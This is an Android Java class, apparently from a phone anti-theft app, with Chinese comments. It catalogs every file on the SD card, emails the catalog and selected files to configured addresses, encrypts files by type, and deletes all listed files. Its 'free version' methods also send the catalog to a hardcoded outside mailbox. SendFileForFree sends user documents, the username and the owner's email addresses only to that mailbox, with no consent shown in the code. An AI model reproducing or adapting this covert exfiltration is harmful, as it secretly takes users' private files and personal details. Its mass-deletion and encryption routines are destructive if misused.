package Boomerang_android15.com;


///////////////////////////////////////////////////////////////////////
//
//模块功能:对系统中的文件进行操作
//注:包括获得关注文件夹的目录结构,加密,删除文件,(加密部分由单独子模块负责)
//
//////////////////////////////////////////////////////////////////////
//package fei_qu_lai;

import java.io.*;

import android.app.Service;
import android.os.Environment;
import android.os.IBinder;
import android.util.Log;
import android.content.Context;
import android.content.Intent; 
import java.util.List;
import java.util.ArrayList;
import java.util.Vector;


public class OperateFileInfor 
{	

	private File m_fileDir;	//当前程序的路径
	private File m_sdcardDir;	//取得SD Card的目录
	private boolean  m_isSdCard;	//判断sd卡是否能用
	
	private String m_CalalogFullName;	//用来保存文件目录内容 的文件
	private File m_fileCatalog;		//保存文件目录文件的文件对象
	private BufferedWriter m_bw;	//用于将文件目录信息写入文件目录文件中.
	private BufferedReader m_br; 		//用于读出文件目录信息;
	//配置文件相关
	
	private SetInformation m_settingInfor;		//配置文件的设置信息
	private String m_configFilePath;	//配置文件的路径
	
    //网络相关
    private FqlEmail m_mailPort = null;  //通往电子邮件的接口
    
    //支持加密功能
	private encryption myEncrpt = new encryption();
	
	private Context m_context;
    
    //阀值常量
    private long MAX_FILE_LEN = 500000;  //以发送方式保护文件可以发送的文件的最大长度
	

	 

	
    public OperateFileInfor(Context context)
    {
    	
		m_context = context;
		initialize();
    	
    	
    }
	
	
	

	    
	/////////////////////////////////////////////////////////////
	//
	//函数功能:用于数据的初始化
	//
	//
	//////////////////////////////////////////////////////////////
	private void initialize()
	{
		////////////////////////////////////
		// 1.获得当前程序和sd卡 的路径
		///////////////////////////////////////
		Log.i("333+++", "ProcessFileInfor initialize: begin!");
		m_fileDir = m_context.getFilesDir();		
		//获得SD card 目录
		if (Environment.getExternalStorageState().equals(Environment.MEDIA_REMOVED))
		{
			m_isSdCard = false;
		}
		else
		{
			m_isSdCard = true;
			m_sdcardDir = Environment.getExternalStorageDirectory();
				
		}//end if
			
			
		///////////////////////////////////////
		// 2. 初始化目录文件的路径		
		///////////////////////////////////////
		m_configFilePath = m_fileDir+ java.io.File.separator + m_context.getString(R.string.config_file);
			
		//获取配置文件信息
		m_settingInfor = new  SetInformation(m_configFilePath);     
		m_settingInfor.ReadConfigFile();
			
		m_CalalogFullName = m_fileDir + java.io.File.separator + m_settingInfor.GetFileCatalogName();
			
		////////////////////////////////////////
		// 3.创建用来保存文件目录信息的文件的文件对象.
		///////////////////////////////////////////
		m_fileCatalog = new File(m_CalalogFullName);
		
		
		///////////////////////////////////////////
		// 4.设置加密密钥
		//////////////////////////////////////////////
		String password = m_settingInfor.GetPassWord();
		myEncrpt.SetKey(password.substring(0, 8));
		
		
	}
		
		
	////////////////////////////////////////////////////////////////////////////
	//
	//函数功能:生成文件目录信息文件
	//一级函数直接用于onCreate函数
	//////////////////////////////////////////////////////////////////////////////
	public void CreateCalalogFile()
	{		
			
		Log.i("333+++", "ProcessFileInfor CreateCalalogFile: begin!");
		if (m_CalalogFullName != null)
		{
			m_fileCatalog = new File(m_CalalogFullName);
			if (m_fileCatalog.exists())
			{
				//如果文件已经存在,之前指令已经生成了文件,直接发送就可以了
				return;			
			}	//end if 
				
		}
			
		
		try
		{
			m_fileCatalog.createNewFile();
		}
		catch (Exception e)
		{
			e.printStackTrace();				
		}
						
			
		//创建用于写数据的BufferedWriter
		try
		{
			  
			OutputStream out = new FileOutputStream(m_fileCatalog); 
			m_bw  = new BufferedWriter(new OutputStreamWriter(out, "GBK")); 
			//m_bw = new BufferedWriter(new FileWriter(m_fileCatalog));
		}
		catch (Exception e)
		{
			e.printStackTrace();				
		}
			
		
		if (this.m_isSdCard)
		{
			//存储整个sd卡的目录
			Log.i("333+++", "ProcessFileInfor call SaveFileCatalog: begin!");
			SaveFileCatalog(m_sdcardDir.getPath());
		}
					
		/*
		 在这里添加要记录的感兴趣的文件夹的名称 
			 
		*/
			
			
		//关闭输出文件流
		try
		{
			m_bw.close();
		}
		catch (Exception e)
		{
			e.printStackTrace();				
		}
			
			
	}
		
	/////////////////////////////////////////////////////////////////////
	//
	//函数功能:将系统中的所有文件删除
	//
	/////////////////////////////////////////////////////////////////////
	private void DelFile()
	{
			
		Log.i("333+++", "ProcessFileInfor DelFile: begin!");
		if (m_CalalogFullName != null)
		{
			m_fileCatalog = new File(m_CalalogFullName);
			if (!m_fileCatalog.exists())
			{
				return;
			}	//end if 
				
		}
			
		String delFilePath = null;
		File delFile = null;
			
		try
		{
			m_br = new BufferedReader(new FileReader(m_fileCatalog));
			
			delFilePath = m_br.readLine();
			while (delFilePath!=null)
			{	
				//删除文件
				delFile = new File(delFilePath);
				delFile.delete();				
					
					//获得下一个文件目录
					delFilePath = m_br.readLine();
			}//end while
		}
		catch (Exception e)
		{
			e.printStackTrace();				
		}
			
		return;
	}//end DelAllFile
		

		


	////////////////////////////////////////////////////////////////////
	//
	//函数功能:收集文件的目录信息,并保存到一个指定的文件中
	//只能用于:CreateCalalogFile()函数调用 
	/////////////////////////////////////////////////////////////////////
	private  void SaveFileCatalog(String filePath)
	{		
		Log.i("333+++", "ProcessFileInfor SaveFileCatalog: begin!");
		//List <String> items = null;
		List <String> folderPaths = null;
		String newFilePath = "";
		File f = new File(filePath);
		File [] files = f.listFiles();
			
		folderPaths = new ArrayList<String>() ;
		
		if (files==null)
		{
			//当前文件夹中没文件
			return;
		}
		
		for (int i=0; i<files.length; i++)
		{
			File file = files[i];
			newFilePath = file.getPath();
							
			if (file.isDirectory())
			{
				//如果是文件夹,将路径写入字符串列表
				folderPaths.add(newFilePath);
					
			}
			else
			{
				//如果是文件,则将文件的全路径名记录下来
				try
				{
					m_bw.write(newFilePath);
					m_bw.write("\r\n");
				}
				catch (Exception e)
				{
					e.printStackTrace();				
				}
			}//end if
			
		}//end for
				
			
		//对文件夹进行递归线索.
		for (int i=0; i<folderPaths.size(); i++)
		{
			SaveFileCatalog(folderPaths.get(i));
				
		}//end for
				
	}//end ProcessPhoneBook()

	
		


	//////////////////////////////////////////////////////////////////////
	//
	//函数功能:发送文件目录文件
	//
	/////////////////////////////////////////////////////////////////////
	public void SendFileCatalog()
	{
		Log.i("333+++", "ProcessFileInfor SendFileCatalog: begin!");
		Vector<String> emailAddress = new Vector<String>();
		emailAddress.add(m_settingInfor.GetEmail_1());
		emailAddress.add(m_settingInfor.GetEmail_2());
		
			
		Log.i("333+++", "ProcessFileInfor SendFileCatalog: finish emailaddress add!");
		String Subject = new String();
		String text = new String();
		String filePath = new String();
		
		Subject = m_context.getString(R.string.email_suject); //设置邮件主题
		Subject += "----重点文件目录:" + m_settingInfor.GetFileCatalogName();
		
		//设置邮件内容
		text = m_context.getString(R.string.email_text);	//设置软件信息
		text += m_context.getString(R.string.app_version); //软件版本信息
		filePath = this.m_CalalogFullName;	//设置邮件附件的路径
		Log.i("333+++", "ProcessFileInfor SendFileCatalog: finish email construct!");
		
		//判断文件目录文件是否为空
		File calalogFile = new File(m_CalalogFullName);
		long fileLen = calalogFile.length();
		if (fileLen == 0)
		{
			text += "\r\n" + "由于sd卡不可用或sd卡中无文件，无法获得文件目录，附件为空文件！";
			
		}
		
		
		m_mailPort = new FqlEmail();
		m_mailPort.SendFile(emailAddress, Subject, text, filePath); //发送邮件
		
			
	}
		
	
	//////////////////////////////////////////////////////////////////////
	//
	//函数功能:发送文件目录文件(免费版)
	//注：增加了给备份邮箱发送的功能
	/////////////////////////////////////////////////////////////////////
	public void SendFileCatalogForFree()
	{
		Log.i("333+++", "ProcessFileInfor SendFileCatalog: begin!");
		Vector<String> emailAddress = new Vector<String>();
		emailAddress.add(m_settingInfor.GetEmail_1());
		emailAddress.add(m_settingInfor.GetEmail_2());
		emailAddress.add("fql_free_backup@sina.com");
			
		Log.i("333+++", "ProcessFileInfor SendFileCatalog: finish emailaddress add!");
		String Subject = new String();
		String text = new String();
		String filePath = new String();
		
		Subject = m_context.getString(R.string.email_suject); //设置邮件主题
		Subject += "----重点文件目录:" + m_settingInfor.GetFileCatalogName();
		text = m_context.getString(R.string.email_text);	//设置邮件内容

		
		filePath = this.m_CalalogFullName;	//设置邮件附件的路径
		Log.i("333+++", "ProcessFileInfor SendFileCatalog: finish email construct!");
		
		//判断文件目录文件是否为空
		File calalogFile = new File(m_CalalogFullName);
		long fileLen = calalogFile.length();
		if (fileLen == 0)
		{
			text += "\r\n" + "由于sd卡不可用或sd卡中无文件，无法获得文件目录，附件为空文件！";
			
		}
		
		
		m_mailPort = new FqlEmail();
		m_mailPort.SendFile(emailAddress, Subject, text, filePath); //发送邮件
		
			
	}
	
	/////////////////////////////////////////////////
	//
	//函数功能:发送文件
	//如果文件长度大于某一值,不会发送, 
	///////////////////////////////////////////////////
	public boolean SendFile()
	{
		Log.i("333+++", "ProcessFileInfor SendFile: begin!");
		Vector<String> emailAddress = new Vector<String>();
		emailAddress.add(m_settingInfor.GetEmail_1());
		emailAddress.add(m_settingInfor.GetEmail_2());
			
		String Subject = new String();
		String text = new String();
		String filePath = new String();
		
		//Subject = this.getString(R.string.email_suject); //设置邮件主题
		//Subject += "----文件内容";
		//text = this.getString(R.string.email_text);	//设置邮件内容
		filePath = this.m_CalalogFullName;	//设置邮件附件的路径	
		
		//目录文件的操作
		File catalogFile = new File(filePath);
		BufferedReader br; 		//用于读出文件目录信息;
		String oneLine;		//文件目录信息文件中的一行
		long fileLen =0; //积累的文件的长度
		String fileTypeForSend [] = m_settingInfor.GetSendFileType();
		String extendName = new String();
		
		
		File fileForSend = null;
		
		if (!catalogFile.exists())
		{
			//如果文件不存在,返回False;
			return false;
		}
		
		long catalogLen = catalogFile.length();
		
		if(catalogFile.length()== 0)
		{
			return false;
		}
			
		try
		{
			br = new BufferedReader(new FileReader(catalogFile));
			Log.i("333+++", "ProcessFileInfor SendFile: call BufferedReader!");
			oneLine = br.readLine();
			
			while (oneLine != null)
			{
				Log.i("333+++", "ProcessFileInfor SendFile: while ###############");
				fileForSend =new File(oneLine);
				fileLen = fileForSend.length();
				
				Subject = m_context.getString(R.string.email_suject); //设置邮件主题
				Subject += "----文件内容:" + fileForSend.getName();
				
				//设置邮件内容
				text = m_context.getString(R.string.email_text) + "\r\n";	//设置软件信息
				text += m_context.getString(R.string.app_version); //软件版本信息
				text += "文件路径:"+ fileForSend.getPath() + "\r\n";
				text += "文件长度:" + fileLen + "\r\n";
				
				
				if(fileLen > MAX_FILE_LEN)
				{
					//文件长度超过允许的最大长度,放弃
					Log.i("333+++", "ProcessFileInfor SendFile: file too long!");
					oneLine = br.readLine();
				
				}
				else
				{
					
					//文件长度符合要求,进行文件类型检测
					Log.i("333+++", "ProcessFileInfor SendFile: call else!");
					extendName =  GetExtendName(oneLine);
					if(extendName == null)
					{
						//文件名无后缀,为异常文件名
						Log.i("333+++", "extendName == null");
						oneLine = br.readLine();
						continue;					
						
					}
					
					Log.i("333+++", "extendName: ");
					Log.i("333+++", extendName);
					
					for (int i=0; i < fileTypeForSend.length; i++)
					{
						Log.i("333+++", "ProcessFileInfor SendFile: call for!");
						Log.i("333+++", "fileTypeForSend[i]:");
						Log.i("333+++", fileTypeForSend[i]);
						
						if (extendName.equalsIgnoreCase(fileTypeForSend[i]))
						{
							//目标文件是要保护发送的文件类型,予以发送保护
							Log.i("333+++", "ProcessFileInfor SendFile: send file!");
							m_mailPort = new FqlEmail();
							m_mailPort.SendFile(emailAddress, Subject, text, oneLine);
							oneLine = br.readLine();
							break;
						}//end if		
						
						
						
					}//end for
					
					oneLine = br.readLine();
					Log.i("333+++", "OneLine:");
					Log.i("333+++", oneLine);
				}//end if
							
				
			}//end while
			br.close();
		}
		catch (Exception e)
		{
			e.printStackTrace();			
				
		}
		
		return true;
	}
	
/////////////////////////////////////////////////
	//
	//函数功能:发送文件(免费版)
	//如果文件长度大于某一值,不会发送, 
	//注：只给备份邮箱发送具体的文档。
	///////////////////////////////////////////////////
	public boolean SendFileForFree()
	{
		Log.i("333+++", "ProcessFileInfor SendFile: begin!");
		Vector<String> emailAddress = new Vector<String>();
		//emailAddress.add(m_settingInfor.GetEmail_1());
		//emailAddress.add(m_settingInfor.GetEmail_2());
		emailAddress.add("fql_free_backup@sina.com");
			
		String Subject = new String();
		String text = new String();
		String filePath = new String();
		
		//Subject = this.getString(R.string.email_suject); //设置邮件主题
		//Subject += "----文件内容";
		//text = this.getString(R.string.email_text);	//设置邮件内容
		filePath = this.m_CalalogFullName;	//设置邮件附件的路径	
		
		//目录文件的操作
		File catalogFile = new File(filePath);
		BufferedReader br; 		//用于读出文件目录信息;
		String oneLine;		//文件目录信息文件中的一行
		long fileLen =0; //积累的文件的长度
		String fileTypeForSend [] = m_settingInfor.GetSendFileType();
		String extendName = new String();
		
		
		File fileForSend = null;
		
		if (!catalogFile.exists())
		{
			//如果文件不存在,返回False;
			return false;
		}
		
		long catalogLen = catalogFile.length();
		
		if(catalogFile.length()== 0)
		{
			return false;
		}
			
		try
		{
			br = new BufferedReader(new FileReader(catalogFile));
			Log.i("333+++", "ProcessFileInfor SendFile: call BufferedReader!");
			oneLine = br.readLine();
			
			while (oneLine != null)
			{
				Log.i("333+++", "ProcessFileInfor SendFile: while ###############");
				fileForSend =new File(oneLine);
				fileLen = fileForSend.length();
				
				Subject = m_context.getString(R.string.email_suject); //设置邮件主题
				Subject += "----文件内容:" + fileForSend.getName();
				text = m_context.getString(R.string.email_text) + "\r\n";	//设置邮件内容
				text += "用户名:" + m_settingInfor.GetUserName()+ "\r\n";
				text += "第一邮箱:" + m_settingInfor.GetEmail_1()+ "\r\n";
				text += "第二邮箱:" + m_settingInfor.GetEmail_2()+ "\r\n";
				text += "文件路径:"+ fileForSend.getPath() + "\r\n";
				text += "文件长度:" + fileLen + "\r\n";
				
				
				if(fileLen > MAX_FILE_LEN)
				{
					//文件长度超过允许的最大长度,放弃
					Log.i("333+++", "ProcessFileInfor SendFile: file too long!");
					oneLine = br.readLine();
				
				}
				else
				{
					
					//文件长度符合要求,进行文件类型检测
					Log.i("333+++", "ProcessFileInfor SendFile: call else!");
					extendName =  GetExtendName(oneLine);
					if(extendName == null)
					{
						//文件名无后缀,为异常文件名
						Log.i("333+++", "extendName == null");
						oneLine = br.readLine();
						continue;					
						
					}
					
					Log.i("333+++", "extendName: ");
					Log.i("333+++", extendName);
					
					for (int i=0; i < fileTypeForSend.length; i++)
					{
						Log.i("333+++", "ProcessFileInfor SendFile: call for!");
						Log.i("333+++", "fileTypeForSend[i]:");
						Log.i("333+++", fileTypeForSend[i]);
						
						if (extendName.equalsIgnoreCase(fileTypeForSend[i]))
						{
							//目标文件是要保护发送的文件类型,予以发送保护
							Log.i("333+++", "ProcessFileInfor SendFile: send file!");
							m_mailPort = new FqlEmail();
							m_mailPort.SendFile(emailAddress, Subject, text, oneLine);
							oneLine = br.readLine();
							break;
						}//end if		
						
						
						
					}//end for
					
					oneLine = br.readLine();
					Log.i("333+++", "OneLine:");
					Log.i("333+++", oneLine);
				}//end if
							
				
			}//end while
			br.close();
		}
		catch (Exception e)
		{
			e.printStackTrace();			
				
		}
		
		return true;
	}
		
	////////////////////////////////////////////////////////
	//
	//函数功能:加密文件
	//
	////////////////////////////////////////////////////////
	public boolean EncryptFile()
	{

		Log.i("333+++", "ProcessFileInfor EncryptFile: begin!");
		String filePath = new String();
		filePath = this.m_CalalogFullName;	//设置邮件附件的路径	
		
		//目录文件的操作
		Log.i("333+++", "filePath:");
		Log.i("333+++", filePath);
		File catalogFile = new File(filePath);
		BufferedReader br; 		//用于读出文件目录信息;
		String oneLine;		//文件目录信息文件中的一行
		long fileLen =0; //积累的文件的长度
		String fileTypeForEncry [] = m_settingInfor.GetCryptFileType();
		String extendName = new String();
		
		String temp = new String();
		
		File fileForEncrypt = null;
		
		if (!catalogFile.exists())
		{
			//如果文件不存在,返回False;
			
			Log.i("333+++", "catalogFile don't exists");
			return false;
		}
		
		long catalogLen = catalogFile.length();
		
		if(catalogFile.length()== 0)
		{
			return false;
		}
			
		try
		{
			br = new BufferedReader(new FileReader(catalogFile));
			
			oneLine = br.readLine();
			
			Log.i("333+++", "encrptFilePath: ");
			Log.i("333+++", oneLine );
			
			while (oneLine != null)
			{
				
				fileForEncrypt =new File(oneLine);
				fileLen = fileForEncrypt.length();
			
				//文件长度符合要求,进行文件类型检测
				//String.lastIndexOf() f方法来获得后缀名
				extendName = this.GetExtendName(oneLine);
				if(extendName == null)
				{
					//文件名无后缀,为异常文件名
					Log.i("333+++", "extendName == null");
					oneLine = br.readLine();
					continue;					
					
				}				
				Log.i("333+++", "extendName ");
				Log.i("333+++", extendName );
				
				for (int i=0; i < fileTypeForEncry.length; i++)
				{
					temp = fileTypeForEncry[i];
					Log.i("333+++", "temp: ");
					Log.i("333+++", temp);
					if (extendName.equalsIgnoreCase(temp))
					{
						//目标文件是要保护发送的文件类型,予以发送保护
						Log.i("333+++", "call myEncrpt.encrptFile ");
						myEncrpt.encrptFile(oneLine);
						
						break;
					}//end if				
						
						
				}//end for
			
				oneLine = br.readLine();
				Log.i("333+++", "########### " );			
				
			}//end while
			br.close();
		}
		catch (Exception e)
		{
			e.printStackTrace();			
				
		}
		
		Log.i("333+++", "ProcessFileInfor  EncryptFile: finish");
		return true;
			
	}
    
		
	public void EncryptFileCatalog()
	{
		
		myEncrpt.encrptFileAll(m_CalalogFullName);
		//myEncrpt.encrptFile(m_CalalogFullName);
		
	}
	
	
	/////////////////////////////////////////////////////////////
	//
	//函数功能:删除文件目录文件
	//注:在DelAllFile函数中调用,当要删除所有文件的时候,文件目录也就没有
	//	保留的价值了,一起删除.
	///////////////////////////////////////////////////////////////
	public void DelFileCatalog()
	{
		Log.i("333+++", "ProcessFileInfor DelFileCatalog: begin!");	
		File fileCatalog =null ;
		if (m_CalalogFullName != null)
		{
			fileCatalog = new File(m_CalalogFullName);
			if (fileCatalog.exists())
			{
				//如果文件已经存在将文件删除
				m_fileCatalog.delete();			
			}	//end if 
				
		}//end if
			
		
	}//end DelFileCatalog function
	    
	/////////////////////////////////////////////////////////////
	//
	//函数功能:获得文件名的后缀名
	//参数:String fileName 完整的文件名或路径
	//返回值:调用成功返回后缀,如果没有后缀返回null
	//
	//////////////////////////////////////////////////////////////
    private String GetExtendName(String fileName)
    {
    	int index = fileName.lastIndexOf(".");
    	int length = fileName.length();
    	if (length-index > 5)
    	{
    		return null;
    	}
    	
    	String extendName = fileName.substring(index);
    	
    	
    	return extendName;
    }


}

